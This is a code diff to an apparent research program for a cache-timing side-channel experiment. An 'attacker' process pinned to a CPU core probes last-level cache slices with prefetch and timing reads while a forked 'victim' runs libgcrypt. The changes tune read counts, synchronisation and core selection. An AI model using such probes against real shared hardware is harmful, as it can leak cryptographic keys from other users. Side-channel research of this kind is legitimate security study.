@@ -11,14 +11,16 @@
 #include "./lib/memory-utils.c"
 #include "./lib/cache-utils.c"
 #include <semaphore.h>
+#include <pthread.h>
 
 #define NEED_GCRYPT_VERSION "1.5.0"
 #define SNAME "/home/hwnam/mysem"
 #define NUMBER_CORES 8
-#define READ_TIMES 4096
+#define READ_TIMES 16384
 
 sem_t *mutex;
 sem_t *mutex1;
+int custom_lock;
 
 void CorePin(int coreID)
 {
@@ -32,12 +34,6 @@ void CorePin(int coreID)
 }
 
 int main_victim(){
-
-    if (!gcry_check_version(NEED_GCRYPT_VERSION)){
-        fprintf (stderr, "libgcrypt is too old (need %s, have %s)\n",
-         NEED_GCRYPT_VERSION, gcry_check_version (NULL));
-        exit (2);
-    }
 
     gcry_error_t err = 0;
 
@@ -200,6 +196,7 @@ int main_attacker(int coreID, int desiredSlice) {
         
 	/* Ping program to coreID */
     CorePin(coreID);
+	//sched_yield();
 
 	unsigned char *slice;
 	int maxnum = READ_TIMES*(nL2Chunks/stride + 1)*2;
@@ -207,8 +204,8 @@ int main_attacker(int coreID, int desiredSlice) {
 	int *accesstimes = (int*)malloc(sizeof(int)*READ_TIMES*maxnum);
 	int cnt = 0;
 	sem_post(mutex);
+	printf("posted\n");
 	sem_wait(mutex1);
-
 	// Fill Arrays 
 	for(i=0; i<nTotalChunks;i++) {
 		slice=totalChunks[i];
@@ -255,12 +252,15 @@ int main_attacker(int coreID, int desiredSlice) {
 			_mm_prefetch(&slice[2], _MM_HINT_T2);
 			_mm_prefetch(&slice[4], _MM_HINT_T2);
 			_mm_prefetch(&slice[8], _MM_HINT_T2);
-			//_mm_prefetch(&slice[16], _MM_HINT_T2);
+			_mm_prefetch(&slice[16], _MM_HINT_T2);
+			
 			times[cnt] = time1;
 			accesstimes[cnt++] = time2-time1;
 
 		}
-
+		while(custom_lock>1){
+			usleep(300);
+		}
 	}
 	
 
@@ -281,33 +281,63 @@ int main_attacker(int coreID, int desiredSlice) {
 
 int main(int argc, char **argv){
     
-    //shared exit flag
-    //short *exited;
-    //exited = mmap(NULL, sizeof(short), PROT_READ | PROT_WRITE, MAP_SHARED, -1, 0);
-    //*exited = 0;
+	if (!gcry_check_version(NEED_GCRYPT_VERSION)){
+        fprintf (stderr, "libgcrypt is too old (need %s, have %s)\n",
+         NEED_GCRYPT_VERSION, gcry_check_version (NULL));
+        exit (2);
+    }
+	
+	/*
+    if(argc!=3){
+		printf("Wrong Input! Enter desired slice and coreID!\n");
+		printf("Enter: %s <coreID> <sliceNumber>\n", argv[0]);
+		exit(1);
+	}
 
-	//sem_t sem_i, sem_f;
+
+	if(coreID > NUMBER_CORES*2-1 || coreID < 0){
+		printf("Wrong Core! CoreID should be less than %d and more than 0!\n", NUMBER_CORES);
+		exit(1);   
+	}
+
+
+	if(desiredSlice > NUMBER_SLICES-1 || desiredSlice < 0){
+		printf("Wrong slice! Slice should be less than %d and more than 0!\n", NUMBER_SLICES);
+		exit(1);   
+	}
+	*/
+
 	int errn;
 	mutex = (sem_t *)mmap(NULL, sizeof(sem_t), PROT_READ | PROT_WRITE, \
-		MAP_NORESERVE | MAP_ANONYMOUS | MAP_SHARED, 0, 0);
+		MAP_NORESERVE | MAP_ANONYMOUS | MAP_SHARED, -1, 0);
 	mutex1 = (sem_t *)mmap(NULL, sizeof(sem_t), PROT_READ | PROT_WRITE, \
-		MAP_NORESERVE | MAP_ANONYMOUS | MAP_SHARED, 0, 0);
+		MAP_NORESERVE | MAP_ANONYMOUS | MAP_SHARED, -1, 0);
 	errn = sem_init(mutex, 1, 0);
 	errn = sem_init(mutex1, 1, 0);
+	printf("custom lock is %d\n",custom_lock);
+	
+	//pthread_mutexattr_t mattr;
+	//pthread_mutexattr_init(&mattr);
+	//pthread_mutexattr_setpshared(&mattr, PTHREAD_PROCESS_SHARED);
+	//custom_lock = (pthread_mutex_t *)mmap(NULL, sizeof(pthread_mutex_t), PROT_READ | PROT_WRITE, \
+	//	MAP_NORESERVE | MAP_ANONYMOUS | MAP_SHARED, 0, 0);
+	//errn = pthread_mutex_init(custom_lock, &mattr);
+	//pthread_mutex_unlock(custom_lock);
+	//printf("%d\n",errn);
+
+
 	//sem_getvalue(&sem_i, &errn);
     pid_t cpid;
     cpid = fork();
 
     if (cpid != 0){
         //parent process = attacker
-        return main_attacker(1,7);
+        return main_attacker(2,6);
 		//return 0;
     } else {
         //child process = victim
         CorePin(3);
-		sched_yield();
 		//sem_wait(&sem_i);
-		printf("tag,time,iteration\n");
         int retval = main_victim();
         //*exited = 1;
         return retval;
